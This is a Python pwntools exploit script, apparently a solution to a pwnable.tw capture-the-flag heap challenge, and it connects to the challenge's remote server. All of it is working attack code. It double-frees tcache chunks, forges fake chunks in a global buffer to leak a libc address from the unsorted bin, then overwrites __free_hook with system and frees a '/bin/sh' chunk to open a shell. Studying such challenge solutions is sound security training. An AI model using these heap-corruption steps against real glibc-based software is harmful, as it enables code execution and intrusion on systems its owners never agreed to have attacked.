#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
# context.update(binary=elf, log_level="DEBUG")
# p = elf.process()
# gdb.attach(
#     p,
#     """
# 	b *0x400c3d
# 	b *0x400c54
# 	b *0x400c64
# """,
# )
p = remote("chall.pwnable.tw", "10207")


def Malloc(size, data):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Size", str(int(size)).encode())
    p.sendlineafter(b"Data:", data)


def Free():
    p.sendlineafter(b"Your choice :", b"2")


def Info():
    p.sendlineafter(b"Your choice :", b"3")
    p.recvuntil(b"Name :")
    leak = p.recvline()
    return leak


name_addr = 0x602060
ptr_addr = 0x602088

name = p64(0) + p64(0x501)
p.sendlineafter(b"Name:", name)

########## fake chunk after unsorted chunk fake in name address
Malloc(0x50, b"A")
Free()
Free()

Malloc(0x50, p64(name_addr + 0x500))
Malloc(0x50, p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21))
Malloc(
    0x50, p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21)
)  # fake chunk bypass check unsorted

############### Fake chunk is unsorted bins in name address
Malloc(0x30, b"A")
Free()
Free()

Malloc(0x30, p64(name_addr + 0x10))
Malloc(0x30, b"B")
Malloc(0x30, b"B")

# leak
Free()
leak = u64(Info()[16:24])
libc.address = leak - libc.symbols["main_arena"] - 96
free_hook = libc.symbols["__free_hook"]
system = libc.symbols["system"]
log.info(("Libc base address: ").ljust(30, " ") + hex(libc.address))
log.info(("&__free_hook address: ").ljust(30, " ") + hex(free_hook))
log.info(("system address: ").ljust(30, " ") + hex(system))

########### write __free_hook
Malloc(0x40, b"A")
Free()
Free()

Malloc(0x40, p64(free_hook))
Malloc(0x40, p64(0x0))
Malloc(0x40, p64(system))

# get shell
Malloc(0x20, b"/bin/sh")
Free()

p.interactive()
